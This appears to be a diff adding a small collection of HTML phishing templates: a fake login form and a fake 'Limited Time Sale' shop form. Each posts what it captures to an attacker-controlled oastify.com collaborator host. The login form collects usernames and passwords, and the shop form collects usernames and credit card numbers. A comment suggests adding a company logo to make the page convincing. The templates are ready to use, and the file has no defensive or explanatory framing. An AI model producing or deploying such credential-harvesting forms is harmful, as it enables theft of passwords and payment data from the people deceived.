@@ -1,0 +1,31 @@
+### Login Page/Form ###
+
+<form action="https://oqizmjuwq58kq83wxs2btnlf66cx0noc.oastify.com" method="post">
+ <!-- Try this on if have avatar image link <div class="imgcontainer">
+<img src="https://link_company_logo_image" alt="Avatar" class="avatar">
+</div>-->
+<div class="container">
+<label for="username"><b>Username</b></label>
+<input type="text" placeholder="Enter Username" name="Username" required>
+<label for="psw"><b>Password</b></label>
+<input type="password" placeholder="Enter Password" name="Password" required>
+<button type="submit">Login</button>
+<label><input type="checkbox" checked="checked" name="remember"> Remember me</label>
+</div>
+<a href="#"><b>Forgot password</b></a>
+</form>
+
+### Shopping Site ###
+
+<form action="https://dq7om8ulqu89qx3lxh20tcl46vcm0do2.oastify.com" method="post">
+<h3>Limited Time Sale</h3>
+<p>Grab Everything you can</p>
+<!--<div class="imgcontainer">
+<img src="https://unsplash.com/s/photos/photo" alt="Avatar" class="avatar">
+</div>-->
+<label for="name"><b>Username</b></label>
+<input type="text" placeholder="Enter Username" name="Username" required>
+<label for="credit_no"><b>credit card no</b></label>
+<input type="password" placeholder="credit card number" name="Credit card no" required>
+<button type="submit">Submit</button>
+</form>
